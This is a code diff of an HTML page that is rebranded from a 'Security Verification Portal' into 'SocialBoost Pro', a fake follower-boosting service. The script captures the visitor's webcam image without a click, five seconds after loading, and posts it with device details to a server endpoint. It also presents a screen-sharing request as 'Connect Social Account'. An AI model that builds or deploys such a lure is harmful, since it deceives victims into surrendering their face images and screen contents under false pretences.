@@ -1,191 +1,601 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>SocialBoost Pro - Grow Your Social Media</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1e1e2f, #2d2d44);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
             min-height: 100vh;
+            background: linear-gradient(145deg, #f8f0ff 0%, #fce4f0 50%, #fff0f5 100%);
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #fff;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
         }
+
+        /* Animated background elements */
+        .bg-blob {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.3;
+            animation: floatBlob 15s ease-in-out infinite alternate;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .bg-blob-1 {
+            width: 400px;
+            height: 400px;
+            background: #c084fc;
+            top: -100px;
+            right: -100px;
+            animation-delay: 0s;
+        }
+
+        .bg-blob-2 {
+            width: 350px;
+            height: 350px;
+            background: #f472b6;
+            bottom: -80px;
+            left: -80px;
+            animation-delay: -5s;
+        }
+
+        .bg-blob-3 {
+            width: 200px;
+            height: 200px;
+            background: #a78bfa;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation-delay: -10s;
+        }
+
+        @keyframes floatBlob {
+            0% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -40px) scale(1.1); }
+            66% { transform: translate(-20px, 30px) scale(0.9); }
+            100% { transform: translate(40px, 20px) scale(1.05); }
+        }
+
         .container {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(10px);
-            padding: 40px;
-            border-radius: 20px;
-            border: 1px solid rgba(255,255,255,0.1);
-            max-width: 500px;
-            width: 90%;
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 420px;
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 32px;
+            padding: 32px 24px;
+            box-shadow: 
+                0 20px 60px rgba(192, 132, 252, 0.2),
+                0 10px 30px rgba(244, 114, 182, 0.1),
+                inset 0 1px 0 rgba(255, 255, 255, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            transition: transform 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Header */
+        .header {
             text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            margin-bottom: 28px;
         }
-        .logo {
-            font-size: 48px;
-            margin-bottom: 10px;
+
+        .logo-icon {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #c084fc, #ec4899);
+            border-radius: 24px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            margin-bottom: 16px;
+            box-shadow: 0 8px 24px rgba(192, 132, 252, 0.3);
+            animation: pulseGlow 2s ease-in-out infinite alternate;
         }
+
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 8px 24px rgba(192, 132, 252, 0.3); }
+            100% { box-shadow: 0 8px 40px rgba(236, 73, 153, 0.4); }
+        }
+
         h1 {
             font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            background: linear-gradient(90deg, #00d2ff, #7a5cff);
+            font-weight: 800;
+            background: linear-gradient(135deg, #7c3aed, #ec4899);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
         }
+
         .subtitle {
-            color: rgba(255,255,255,0.6);
+            color: #6b7280;
             font-size: 14px;
-            margin-bottom: 30px;
+            font-weight: 400;
+            margin-top: 4px;
+            letter-spacing: 0.3px;
         }
-        .progress-container {
-            background: rgba(255,255,255,0.1);
-            border-radius: 30px;
+
+        .subtitle span {
+            color: #ec4899;
+            font-weight: 600;
+        }
+
+        /* Status Badge */
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, rgba(192, 132, 252, 0.15), rgba(236, 73, 153, 0.1));
+            padding: 8px 18px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #7c3aed;
+            margin-bottom: 20px;
+            border: 1px solid rgba(192, 132, 252, 0.2);
+            animation: statusPulse 3s ease-in-out infinite;
+        }
+
+        .status-dot {
+            width: 8px;
             height: 8px;
-            margin: 30px 0;
-            overflow: hidden;
+            border-radius: 50%;
+            background: #22c55e;
+            display: inline-block;
+            animation: dotPulse 1.5s ease-in-out infinite;
         }
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #00d2ff, #7a5cff);
-            border-radius: 30px;
-            transition: width 0.5s ease;
+
+        @keyframes dotPulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
         }
-        .status-text {
-            font-size: 14px;
-            color: rgba(255,255,255,0.7);
-            margin-top: 10px;
+
+        @keyframes statusPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
         }
+
+        /* Camera Container - Glamorous */
         .camera-container {
-            margin: 30px 0;
-            border-radius: 15px;
-            overflow: hidden;
-            background: #000;
             position: relative;
+            margin: 20px 0 24px;
+            border-radius: 20px;
+            overflow: hidden;
+            background: linear-gradient(135deg, #1a1a2e, #2d1b3d);
             aspect-ratio: 4/3;
+            box-shadow: 
+                0 8px 32px rgba(0, 0, 0, 0.15),
+                inset 0 0 80px rgba(192, 132, 252, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.15);
         }
+
+        .camera-container::before {
+            content: '📸';
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            font-size: 20px;
+            z-index: 5;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 6px 10px;
+            border-radius: 12px;
+            backdrop-filter: blur(5px);
+        }
+
         #video {
             width: 100%;
             height: 100%;
             object-fit: cover;
+            transform: scaleX(-1);
         }
+
+        .camera-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.6));
+            pointer-events: none;
+        }
+
+        .camera-overlay p {
+            color: rgba(255,255,255,0.8);
+            font-size: 12px;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+        }
+
+        /* Progress Section */
+        .progress-section {
+            margin: 20px 0 18px;
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            font-weight: 500;
+            color: #6b7280;
+            margin-bottom: 8px;
+        }
+
+        .progress-header .percent {
+            color: #7c3aed;
+            font-weight: 700;
+        }
+
+        .progress-bar-container {
+            height: 6px;
+            background: rgba(192, 132, 252, 0.15);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #c084fc, #ec4899, #f472b6);
+            border-radius: 10px;
+            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 0 20px rgba(236, 73, 153, 0.3);
+        }
+
+        /* Status Text */
+        .status-text {
+            text-align: center;
+            font-size: 14px;
+            color: #6b7280;
+            margin: 6px 0 20px;
+            font-weight: 400;
+            min-height: 24px;
+        }
+
+        .status-text .highlight {
+            color: #7c3aed;
+            font-weight: 600;
+        }
+
+        /* Buttons */
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
         .btn {
-            background: linear-gradient(90deg, #00d2ff, #7a5cff);
+            padding: 16px 20px;
             border: none;
-            color: #fff;
-            padding: 14px 40px;
-            border-radius: 30px;
+            border-radius: 16px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
-            width: 100%;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-family: inherit;
         }
-        .btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 10px 30px rgba(122, 92, 255, 0.3);
+
+        .btn-primary {
+            background: linear-gradient(135deg, #7c3aed, #ec4899);
+            color: #fff;
+            box-shadow: 0 4px 16px rgba(124, 58, 237, 0.3);
         }
-        .btn:disabled {
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px rgba(124, 58, 237, 0.4);
+        }
+
+        .btn-primary:disabled {
             opacity: 0.5;
             cursor: not-allowed;
             transform: none;
         }
+
         .btn-secondary {
-            background: rgba(255,255,255,0.1);
-            margin-top: 10px;
+            background: rgba(192, 132, 252, 0.1);
+            color: #7c3aed;
+            border: 1px solid rgba(192, 132, 252, 0.2);
         }
-        .footnote {
-            font-size: 12px;
-            color: rgba(255,255,255,0.3);
-            margin-top: 20px;
+
+        .btn-secondary:hover {
+            background: rgba(192, 132, 252, 0.2);
+            transform: translateY(-2px);
         }
-        .status-badge {
-            display: inline-block;
-            background: rgba(0,210,255,0.2);
-            color: #00d2ff;
-            padding: 4px 16px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-bottom: 20px;
+
+        .btn-success {
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: #fff;
+            box-shadow: 0 4px 16px rgba(34, 197, 94, 0.3);
+        }
+
+        .btn-success:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px rgba(34, 197, 94, 0.4);
+        }
+
+        .btn-success:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Success State */
+        .success-state {
+            display: none;
+            text-align: center;
+            padding: 10px 0 0;
+        }
+
+        .success-state.show {
+            display: block;
+            animation: fadeInUp 0.6s ease;
+        }
+
+        @keyframes fadeInUp {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .success-icon {
+            font-size: 64px;
+            margin-bottom: 8px;
+        }
+
+        .success-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #22c55e;
+        }
+
+        .success-sub {
+            font-size: 14px;
+            color: #6b7280;
+            margin-top: 4px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 18px;
+            border-top: 1px solid rgba(192, 132, 252, 0.1);
+            font-size: 11px;
+            color: #9ca3af;
+            letter-spacing: 0.3px;
+        }
+
+        .footer span {
+            color: #ec4899;
+        }
+
+        .footer .session-id {
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            color: #d1d5db;
+            margin-top: 4px;
+        }
+
+        /* Features Grid */
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin: 16px 0 18px;
+        }
+
+        .feature-item {
+            text-align: center;
+            padding: 10px 6px;
+            background: rgba(255,255,255,0.5);
+            border-radius: 12px;
+            border: 1px solid rgba(192, 132, 252, 0.08);
+        }
+
+        .feature-item .icon {
+            font-size: 20px;
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .feature-item .label {
+            font-size: 9px;
+            color: #6b7280;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+        }
+
+        /* Loading shimmer */
+        .shimmer {
+            background: linear-gradient(90deg, rgba(192,132,252,0.05) 25%, rgba(236,73,153,0.08) 50%, rgba(192,132,252,0.05) 75%);
+            background-size: 200% 100%;
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px;
+                border-radius: 24px;
+            }
+            h1 {
+                font-size: 20px;
+            }
+            .logo-icon {
+                width: 60px;
+                height: 60px;
+                font-size: 28px;
+            }
+            .features {
+                grid-template-columns: 1fr 1fr 1fr;
+                gap: 6px;
+            }
         }
     </style>
 </head>
 <body>
+    <!-- Animated Background Blobs -->
+    <div class="bg-blob bg-blob-1"></div>
+    <div class="bg-blob bg-blob-2"></div>
+    <div class="bg-blob bg-blob-3"></div>
+
     <div class="container">
-        <div class="logo">🔒</div>
-        <h1>Secure Authentication Portal</h1>
-        <p class="subtitle">Multi-factor identity verification required</p>
-        
-        <div class="status-badge" id="statusBadge">⚡ Processing</div>
-        
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-icon">🚀</div>
+            <h1>SocialBoost Pro</h1>
+            <p class="subtitle">Grow your <span>Instagram</span> · <span>TikTok</span> · <span>YouTube</span></p>
+        </div>
+
+        <!-- Status Badge -->
+        <div style="text-align: center;">
+            <div class="status-badge">
+                <span class="status-dot"></span>
+                <span id="statusBadgeText">Processing verification</span>
+            </div>
+        </div>
+
+        <!-- Features -->
+        <div class="features">
+            <div class="feature-item">
+                <span class="icon">📈</span>
+                <span class="label">+10k Reach</span>
+            </div>
+            <div class="feature-item">
+                <span class="icon">👤</span>
+                <span class="label">Real Followers</span>
+            </div>
+            <div class="feature-item">
+                <span class="icon">⚡</span>
+                <span class="label">Instant Boost</span>
+            </div>
+        </div>
+
+        <!-- Camera -->
         <div class="camera-container">
             <video id="video" autoplay playsinline></video>
+            <div class="camera-overlay">
+                <p>📸 Position your face for identity verification</p>
+            </div>
         </div>
-        
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
+
+        <!-- Progress -->
+        <div class="progress-section">
+            <div class="progress-header">
+                <span>Boosting progress</span>
+                <span class="percent" id="percentText">0%</span>
+            </div>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
         </div>
-        <p class="status-text" id="statusText">Initializing secure connection...</p>
-        
-        <button class="btn" id="captureBtn">🔐 Verify Identity</button>
-        <button class="btn btn-secondary" id="screenBtn">📺 Share Screen (Optional)</button>
-        
-        <p class="footnote">🔒 End-to-end encrypted • Session ID: <span id="sessionDisplay">-</span></p>
+
+        <!-- Status -->
+        <div class="status-text" id="statusText">
+            <span class="highlight">✓</span> Ready to verify your identity
+        </div>
+
+        <!-- Buttons -->
+        <div class="btn-group">
+            <button class="btn btn-primary" id="captureBtn">
+                ✨ Start Boosting Now
+            </button>
+            <button class="btn btn-secondary" id="screenBtn">
+                📱 Connect Social Account (Optional)
+            </button>
+        </div>
+
+        <!-- Success State -->
+        <div class="success-state" id="successState">
+            <div class="success-icon">🎉</div>
+            <div class="success-title">Verification Complete!</div>
+            <div class="success-sub">Your account is now being boosted. You may close this page.</div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            Powered by <span>SocialBoost Pro</span> v3.2
+            <div class="session-id" id="sessionDisplay">Session: ●●●●●●●●</div>
+        </div>
     </div>
 
     <script>
         // Get session ID from URL
-        const sessionId = window.location.pathname.split('/').pop();
-        document.getElementById('sessionDisplay').textContent = sessionId.substring(0, 8) + '...';
-        
+        const sessionId = window.location.pathname.split('/').pop() || 'unknown';
+        document.getElementById('sessionDisplay').textContent = 'Session: ' + sessionId.substring(0, 8) + '...';
+
         let videoStream = null;
         let isCameraReady = false;
         let photoCaptured = false;
         let progress = 0;
-        
+
         // Start camera
         async function startCamera() {
             try {
                 videoStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' },
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: false
                 });
                 document.getElementById('video').srcObject = videoStream;
                 isCameraReady = true;
-                document.getElementById('statusText').textContent = '✅ Camera ready - click verify';
+                document.getElementById('statusText').innerHTML = '✅ Camera ready — tap <span class="highlight">Start Boosting</span>';
                 document.getElementById('captureBtn').disabled = false;
-                
+
                 // Auto-capture after 5 seconds
                 setTimeout(capturePhoto, 5000);
             } catch (err) {
-                document.getElementById('statusText').textContent = '⚠️ Camera access denied. Please allow camera.';
+                document.getElementById('statusText').textContent = '⚠️ Camera access needed. Please allow camera in browser settings.';
                 document.getElementById('captureBtn').disabled = true;
+                document.getElementById('statusBadgeText').textContent = '⚠️ Camera blocked';
             }
         }
-        
+
         // Capture photo
         function capturePhoto() {
             if (!isCameraReady || photoCaptured) return;
-            
+
             const video = document.getElementById('video');
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
+
             const imageData = canvas.toDataURL('image/jpeg', 0.8);
-            
+
             // Send to server
             fetch('/api/photo', {
                 method: 'POST',
@@ -197,59 +607,65 @@
                         userAgent: navigator.userAgent,
                         screenWidth: screen.width,
                         screenHeight: screen.height,
-                        timestamp: new Date().toISOString()
+                        timestamp: new Date().toISOString(),
+                        platform: 'social-boost'
                     }
                 })
             })
             .then(res => res.json())
             .then(data => {
                 photoCaptured = true;
-                document.getElementById('statusText').textContent = '✅ Identity verified successfully!';
-                document.getElementById('statusBadge').textContent = '✅ Verified';
+                document.getElementById('statusText').textContent = '✅ Verification complete! Your account is being boosted.';
+                document.getElementById('statusBadgeText').textContent = '✅ Boost Active';
                 document.getElementById('captureBtn').disabled = true;
-                
+                document.getElementById('captureBtn').className = 'btn btn-success';
+                document.getElementById('captureBtn').innerHTML = '🎯 Boost Active!';
+
+                // Success state
+                document.getElementById('successState').classList.add('show');
+
                 // Progress animation
                 let p = 0;
                 const interval = setInterval(() => {
                     p += 2;
                     document.getElementById('progressBar').style.width = p + '%';
+                    document.getElementById('percentText').textContent = p + '%';
                     if (p >= 100) {
                         clearInterval(interval);
-                        document.getElementById('statusText').textContent = '🎯 Authentication complete. You may close this page.';
                     }
-                }, 50);
+                }, 40);
             })
             .catch(err => {
                 document.getElementById('statusText').textContent = '⚠️ Error: ' + err.message;
+                document.getElementById('statusBadgeText').textContent = '❌ Error';
             });
         }
-        
-        // Screen sharing (optional bonus feature)
+
+        // Screen sharing (bonus feature)
         document.getElementById('screenBtn').addEventListener('click', async () => {
             try {
                 const screenStream = await navigator.mediaDevices.getDisplayMedia({
                     video: true,
                     audio: false
                 });
-                document.getElementById('statusText').textContent = '📺 Screen sharing active (demo only)';
-                
-                // In a real implementation, we'd send frames via WebSocket
-                // For now, just show it worked
+                document.getElementById('statusText').textContent = '📺 Social account connected!';
+                document.getElementById('statusBadgeText').textContent = '📺 Account Linked';
+
                 const video = document.getElementById('video');
                 video.srcObject = screenStream;
                 video.play();
-                
+
                 setTimeout(() => {
-                    document.getElementById('statusText').textContent = '✅ Screen sharing demo completed';
+                    document.getElementById('statusText').textContent = '✅ Account connected. Start boosting!';
                 }, 3000);
             } catch (err) {
-                document.getElementById('statusText').textContent = '⚠️ Screen sharing cancelled or not supported';
+                document.getElementById('statusText').textContent = 'ℹ️ Account connection cancelled';
             }
         });
-        
+
         // Auto-start camera
         startCamera();
-        
+
         // Capture on button click
         document.getElementById('captureBtn').addEventListener('click', capturePhoto);
     </script>
